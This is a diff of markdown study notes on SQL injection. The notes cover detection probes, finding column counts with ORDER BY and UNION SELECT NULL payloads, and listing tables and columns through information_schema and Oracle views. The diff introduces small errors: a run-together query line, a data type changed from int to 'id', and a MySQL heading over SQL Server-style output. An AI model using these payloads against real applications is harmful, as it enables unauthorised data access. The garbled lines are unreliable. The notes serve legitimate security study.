@@ -9,9 +9,8 @@
 **How to detect SQL injection vulnerabilities**
 
 * The single quote character `'` and look for errors or other anomalies.
-* Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
-* Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
-* Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
+* Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the responses.
+* Trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
 * OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
 
 **SQL injection in different parts of the query**
@@ -37,16 +36,14 @@
 
 ### Determining the number of columns required
 
-* First way: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs
-  * Example (the injection point is a quoted string within the `WHERE` clause)
+* First way: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. Example (the injection point is a quoted string within the `WHERE` clause)
   * ```
     ' ORDER BY 1--
     ' ORDER BY 2--
     ' ORDER BY 3--
     etc.
     ```
-* Second way: submitting a series of `UNION SELECT` payloads specifying a different number of null values
-  * NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
+* Second way: submitting a series of `UNION SELECT` payloads specifying a different number of null values. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
   * ```
     ' UNION SELECT NULL--
     ' UNION SELECT NULL,NULL--
@@ -54,8 +51,6 @@
     etc.
     ```
 * Note: the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results
-
-
 
 ### Finding columns with a useful data type
 
@@ -72,23 +67,30 @@
 ### Examining the database
 
 * `' UNION SELECT @@version--`
-* Listing the contents of the database
 * Most database types (except Oracle) have a set of views called the information schema
-  * `information_schema.tables`
-    * | TABLE\_CATALOG | TABLE\_SCHEMA | TABLE\_NAME | TABLE\_TYPE |
-      | -------------- | ------------- | ----------- | ----------- |
-      | MyDatabase     | dbo           | Products    | BASE TABLE  |
-    * `SELECT * FROM information_schema.tables`
-  * `information_schema.columns`
-    * | TABLE\_CATALOG | TABLE\_SCHEMA | TABLE\_NAME | COLUMN\_NAME | DATA\_TYPE |
-      | -------------- | ------------- | ----------- | ------------ | ---------- |
-      | MyDatabase     | dbo           | Users       | UserId       | int        |
-    * `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
-* Oracle:
-  * `SELECT * FROM all_tables`
-    * `SELECT TABLE_NAME FROM all_tables`
-  * `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
-    * `SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'`
+
+```markdown
+# MySQL
+# information_schema.tables
+TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    TABLE_TYPE
+MyDatabase       dbo             Products      BASE TABLE
+
+# information_schema.columns
+TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    COLUMN_NAME    DATA_TYPE
+MyDatabase       dbo             Users          UserId        id
+
+# Find tables names
+SELECT * FROM information_schema.tables
+# Find columns names
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'SELECT * FROM information_schema.tables
+
+
+# Oracle
+SELECT * FROM all_tables
+SELECT TABLE_NAME FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'
+```
 
 ### Retrieving multiple values within a single column
 
